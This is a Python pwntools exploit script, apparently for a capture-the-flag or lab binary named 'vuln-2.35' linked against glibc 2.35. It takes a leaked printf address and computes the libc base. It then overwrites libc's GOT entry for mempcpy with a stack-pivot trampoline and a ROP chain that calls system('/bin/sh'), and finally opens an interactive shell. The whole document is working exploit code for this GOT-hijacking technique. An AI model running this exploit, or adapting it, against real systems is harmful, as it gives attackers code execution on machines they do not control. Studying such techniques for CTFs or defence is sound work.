#!/usr/bin/env python3
# coding=utf8

import inspect
from pwn import *

context.log_level = 'debug'

cn = process('./vuln-2.35')
libc = ELF("./libc-2.35.so")

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'


def fx4(libc: ELF, slot, rop_chain):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr

    pivot = libc.address + 0x0000000000035732  # pop rsp; ret
    escape = libc.address + 0x00000000000838f8  # pop rsp; jmp rax
    pr15 = libc.address + 0x000000000002a3e4  # pop r15; ret
    ret = libc.address + 0x000000000002be52  # ret

    write_dest = got + 8
    trampoline_offset = slot * 8 - (write_dest - got)
    rop_offset = 0x10
    assert len(rop_chain) <= trampoline_offset - 0x10 - 8, "use fx3 instead"
    info("rop offset: 0x{:x}".format(rop_offset))
    write_data = flat({
        0x00: write_dest + rop_offset,
        0x08: pivot,
        rop_offset: rop_chain,
        trampoline_offset - 8: pr15,
        trampoline_offset: plt0,
        trampoline_offset + 8: [escape, got + 0x3000 - 8]
    }, filler=p64(ret), word_size=64)

    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

got = lbase + libc.dynamic_value_by_tag("DT_PLTGOT")
mempcpy_got = lbase + 0x219040
got_slot = (mempcpy_got - got) // 8

prdi = lbase + 0x000000000002a3e5  # pop rdi; ret
prax = lbase + 0x0000000000045eb0  # pop rax; ret

rop_chain = flat(
    prdi, libc.search(b"/bin/sh").__next__(),
    prax, libc.sym["system"]
)
dest, payload = fx4(libc, slot=(mempcpy_got - got) // 8, rop_chain=rop_chain)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
